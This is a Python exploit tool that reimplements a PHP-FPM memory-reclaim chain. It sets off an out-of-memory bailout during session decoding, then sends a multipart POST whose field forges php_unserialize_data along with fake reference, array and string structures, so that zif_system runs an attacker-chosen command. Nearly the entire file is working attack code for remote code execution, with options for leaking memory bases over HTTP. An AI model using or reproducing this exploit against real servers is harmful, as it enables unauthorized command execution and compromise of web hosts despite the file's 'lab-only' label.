#!/usr/bin/env python3
"""php2shell 8M FPM reclaim chain (project reimplementation).

Mechanism (docs/research/fpm-8m-reclaim.md, after the public VABISMO/php2shell-nginx-fpm-full-rce
chain -- statically reviewed, reimplemented here, no code copied):

  producer  builder (64M) writes a ~4MB session; chain (8M) GET /app.php
            -> session_start() decodes after RINIT -> OOM
            -> php_execute_script catches the bailout; worker survives
            -> BG(unserialize) = {level=1, data=d}

  consumer  multipart POST /app.php: rfc1867 runs before RINIT
            -> php_session_initialize()/decode() reuses stale d
            -> an 8KB text field's body buffer covers d
            -> the buffer is a forged php_unserialize_data:
               last=d+entries, entries.used_slots=2, data[1]=d+0x300
            -> session R:2 resolves to a fake IS_REFERENCE
            -> fake zend_reference -> fake zend_array
               (pDestructor=zif_system) -> command at session shutdown

The tool needs absolute chunk/PIE bases.  They are stable for the FPM master
lifetime and can be obtained over HTTP by ``fpm_leak.py`` (``--leak``) or, in
a lab, from gdb/oracle.  This implementation takes --chunk/--pie explicitly
unless --leak is given.

Lab-only; authorized targets only.
"""
from __future__ import annotations

import argparse
import http.client
import os
import socket
import struct
import sys
import time

BND = b"RECLAIMB"
# struct php_unserialize_data (PHP 8.4, 8216 bytes)
UNS_LAST = 0
UNS_FIRST_DTOR = 8
UNS_LAST_DTOR = 16
UNS_MAX_DEPTH = 48
UNS_ENTRIES = 56
# var_entries
VE_USED = 0
VE_DATA = 16
# zval
ZV_TYPE = 8
# zend_array
AR_GC = 0
AR_FLAGS = 8
AR_MASK = 12
AR_DATA = 16
AR_NUSED = 24
AR_NELEM = 28
AR_NSIZE = 32
AR_DTOR = 48
# zend_reference
REF_GC = 0
REF_VAL = 8
REF_VTYPE = 16
REF_SOURCES = 24
# zend_string
ZS_GC = 0
ZS_LEN = 16
ZS_VAL = 24
# zend_execute_data
EX_RET = 16
EX_ARGS = 44
EX_ARG1 = 80

IS_STRING = 6
IS_REFERENCE = 10
IS_REFERENCE_EX = 0x10A
IS_ARRAY = 7
IS_ARRAY_EX = 0x307
IS_STRING_EX = 0x106


def mp(parts: list[tuple[bytes, bytes, bytes | None]], bnd: bytes) -> bytes:
    out = bytearray()
    for name, value, fname in parts:
        out += b"--" + bnd + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if fname is not None:
            out += b'; filename="' + fname + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + value + b"\r\n"
    out += b"--" + bnd + b"--\r\n"
    return bytes(out)


class Target:
    def __init__(self, url: str, timeout: float = 180.0):
        u = url.split("://", 1)
        if len(u) != 2:
            raise ValueError("URL must be http://host:port")
        self.https = u[0] == "https"
        rest = u[1]
        host, _, port = rest.partition(":")
        self.host = host
        self.port = int((port or ("443" if self.https else "80")).split("/")[0])
        self.timeout = timeout

    def post(self, path: str, body: bytes, cookie: str | None = None,
             read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = [
            f"POST {path} HTTP/1.1",
            f"Host: {self.host}:{self.port}",
        ]
        if cookie:
            hdr.append(f"Cookie: {cookie}")
        hdr += [
            f"Content-Type: multipart/form-data; boundary={BND.decode()}",
            f"Content-Length: {len(body)}",
            "Connection: close",
        ]
        raw = ("\r\n".join(hdr) + "\r\n\r\n").encode() + body
        return self._exch(raw, read_cap)

    def get(self, path: str, cookie: str | None = None,
            read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = [
            f"GET {path} HTTP/1.1",
            f"Host: {self.host}:{self.port}",
        ]
        if cookie:
            hdr.append(f"Cookie: {cookie}")
        hdr.append("Connection: close")
        raw = ("\r\n".join(hdr) + "\r\n\r\n").encode()
        return self._exch(raw, read_cap)

    def _exch(self, raw: bytes, read_cap: int) -> tuple[int, bytes]:
        s = None
        try:
            s = socket.create_connection((self.host, self.port), timeout=self.timeout)
            s.settimeout(self.timeout)
            s.sendall(raw)
            data = bytearray()
            while len(data) < read_cap:
                try:
                    chunk = s.recv(65536)
                except OSError:
                    break
                if not chunk:
                    break
                data.extend(chunk)
        finally:
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        status = 0
        first = head.split(b"\r\n", 1)[0]
        if first.startswith(b"HTTP/"):
            try:
                status = int(first.split()[1])
            except (IndexError, ValueError):
                status = 0
        return status, body


def build_payload(d: int, k: int, size: int, zif: int, cmd: bytes) -> bytes:
    """Forged php_unserialize_data + fake ref/array/frame/string at d."""
    if k + 0x900 > size:
        raise ValueError("reclaim size too small for the endgame layout")
    if len(cmd) > 0x57 or b"\x00" in cmd:
        raise ValueError("command must be 1..87 bytes and contain no NUL")
    b = bytearray(size)
    # decode-time struct
    struct.pack_into("<Q", b, k + UNS_LAST, d + UNS_ENTRIES)
    struct.pack_into("<Q", b, k + UNS_FIRST_DTOR, d + 0x400)
    struct.pack_into("<Q", b, k + UNS_LAST_DTOR, d + 0x400)
    struct.pack_into("<q", b, k + UNS_MAX_DEPTH, 64)
    struct.pack_into("<q", b, k + UNS_ENTRIES + VE_USED, 2)
    struct.pack_into("<Q", b, k + UNS_ENTRIES + VE_DATA + 8, d + 0x300)
    struct.pack_into("<q", b, k + 0x400 + VE_USED, 0)
    # fake zval: IS_REFERENCE -> d+0x500
    struct.pack_into("<Q", b, k + 0x300, d + 0x500)
    struct.pack_into("<I", b, k + 0x300 + ZV_TYPE, IS_REFERENCE_EX)
    # fake zend_reference
    struct.pack_into("<I", b, k + 0x500 + REF_GC, 0)
    struct.pack_into("<I", b, k + 0x500 + REF_GC + 4, IS_REFERENCE)
    struct.pack_into("<Q", b, k + 0x500 + REF_VAL, d + 0x700)
    struct.pack_into("<I", b, k + 0x500 + REF_VTYPE, IS_ARRAY_EX)
    struct.pack_into("<Q", b, k + 0x500 + REF_SOURCES, 0)
    # fake zend_array with pDestructor=zif_system
    struct.pack_into("<I", b, k + 0x700 + AR_GC, 1)
    struct.pack_into("<I", b, k + 0x700 + AR_GC + 4, IS_ARRAY)
    struct.pack_into("<I", b, k + 0x700 + AR_FLAGS, 0x10)
    struct.pack_into("<I", b, k + 0x700 + AR_MASK, 0xFFFFFFF8)
    struct.pack_into("<Q", b, k + 0x700 + AR_DATA, d + 0x800)
    struct.pack_into("<I", b, k + 0x700 + AR_NUSED, 1)
    struct.pack_into("<I", b, k + 0x700 + AR_NELEM, 1)
    struct.pack_into("<I", b, k + 0x700 + AR_NSIZE, 8)
    struct.pack_into("<Q", b, k + 0x700 + AR_DTOR, zif)
    # fake Bucket doubling as the zif_system execute_data frame
    struct.pack_into("<Q", b, k + 0x800, d + 0x880)
    struct.pack_into("<I", b, k + 0x800 + ZV_TYPE, IS_STRING)
    struct.pack_into("<Q", b, k + 0x800 + EX_RET, d + 0x8F0)
    struct.pack_into("<H", b, k + 0x800 + EX_ARGS, 1)
    struct.pack_into("<Q", b, k + 0x800 + EX_ARG1, d + 0x880)
    struct.pack_into("<I", b, k + 0x800 + EX_ARG1 + ZV_TYPE, IS_STRING_EX)
    # fake zend_string holding the command
    struct.pack_into("<I", b, k + 0x880 + ZS_GC, 1)
    struct.pack_into("<I", b, k + 0x880 + ZS_GC + 4, IS_STRING)
    struct.pack_into("<Q", b, k + 0x880 + ZS_LEN, len(cmd))
    b[k + 0x880 + ZS_VAL:k + 0x880 + ZS_VAL + len(cmd)] = cmd
    return bytes(b)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base", required=True, help="chain URL, e.g. http://127.0.0.1:8080")
    ap.add_argument("--builder", required=True, help="builder URL (64M pool)")
    ap.add_argument("--app", default="/app.php")
    ap.add_argument("--ref", default="/ref.php")
    ap.add_argument("--sid", default="fmroom000000000001")
    ap.add_argument("--ref-sid", default="fpmref000000000001")
    ap.add_argument("--oom-size", type=int, default=4 << 20)
    ap.add_argument("--chunk", type=lambda x: int(x, 0))
    ap.add_argument("--pie", type=lambda x: int(x, 0))
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--leak", action="store_true",
                    help="obtain chunk/PIE over HTTP with fpm_leak.py")
    ap.add_argument("--pcre-efree", type=lambda x: int(x, 0), default=0x31D400,
                    help="php_pcre_efree offset used by --leak")
    ap.add_argument("--leak-arm", default="/bigvar.php",
                    help="builder arm path used by --leak")
    ap.add_argument("--leak-profile", choices=("debug", "official"),
                    default="debug",
                    help="debug: two-stage PCRE; official: chunk+0x56c60 handler table")
    ap.add_argument("--leak-sid", default=None,
                    help="session id used only by --leak (random when omitted)")
    ap.add_argument("--leak-ref-sid", default=None,
                    help="ref session id used only by --leak (random when omitted)")
    ap.add_argument("--d-off", type=lambda x: int(x, 0), default=0x6F000)
    ap.add_argument("--k", type=lambda x: int(x, 0), default=0xFE8)
    ap.add_argument("--pads", type=lambda s: [int(x, 0) for x in s.split(",") if x.strip()],
                    default=[])
    ap.add_argument("--size", type=int, default=8192)
    ap.add_argument("--cmd", default="id>out/p1")
    ap.add_argument("--proof", default="/out/p1")
    args = ap.parse_args()

    if args.leak and (args.chunk is None or args.pie is None):
        from fpm_leak import leak_bases
        try:
            args.chunk, args.pie = leak_bases(
                args.base, args.builder, sid=args.leak_sid,
                ref_sid=args.leak_ref_sid, pcre_efree=args.pcre_efree,
                arm_path=args.leak_arm, ref_path=args.ref,
                profile=args.leak_profile)
        except (OSError, RuntimeError) as exc:
            print(f"[!] HTTP leak failed: {exc}", file=sys.stderr)
            return 1
        print(f"[*] HTTP leak: chunk=0x{args.chunk:x} pie=0x{args.pie:x}")
    elif args.chunk is None or args.pie is None:
        ap.error("--chunk/--pie are required unless --leak is given")

    base = Target(args.base)
    builder = Target(args.builder)
    zif = args.pie + args.zif_offset
    d = args.chunk + args.d_off
    print(f"[*] chunk=0x{args.chunk:x} pie=0x{args.pie:x} zif=0x{zif:x} "
          f"d=0x{d:x} k=0x{args.k:x} size={args.size} pads={args.pads}")

    # 1) builder: 4MB progress record (cleanup=Off)
    body = mp([
        (b"PHPSESSID", args.sid.encode(), None),
        (b"PHP_SESSION_UPLOAD_PROGRESS", b"A" * args.oom_size, None),
        (b"f", b"x" * 16, b"a.txt"),
    ], BND)
    st, _ = builder.post("/", body)
    print(f"[*] builder oom session -> {st}")

    # 2) producer: chain decodes the 4MB session after RINIT and OOMs
    st, prod = base.get(args.app, cookie="PHPSESSID=" + args.sid)
    print(f"[*] producer -> {st} ({len(prod)}B)")
    if st == 0:
        print("[!] chain did not answer", file=sys.stderr)
        return 1

    # 3) builder: ref session with R:2
    st, _ = builder.post(args.ref, mp([(b"x", b"1", None)], BND),
                         cookie="PHPSESSID=" + args.ref_sid)
    print(f"[*] ref session -> {st}")

    # 4) consumer: pads + forged big + progress + file
    forged = build_payload(d, args.k, args.size, zif, args.cmd.encode())
    parts = [(f"pad{i}".encode(), b"C" * p, None) for i, p in enumerate(args.pads)]
    parts.append((b"big", forged, None))
    parts.append((b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None))
    parts.append((b"f", b"x" * 8, b"a.txt"))
    body = mp(parts, BND)
    st, _ = base.post(args.app, body, cookie="PHPSESSID=" + args.ref_sid)
    print(f"[*] consumer -> {st} (502 expected)")

    # 5) proof
    time.sleep(0.8)
    for _ in range(6):
        st, proof = base.get(args.proof)
        if st == 200 and proof:
            print(f"[+] PROOF: {proof[:200].decode('latin1', 'replace').strip()}")
            return 0
        time.sleep(0.5)
    print(f"[!] no proof at {args.proof} (last status {st})", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
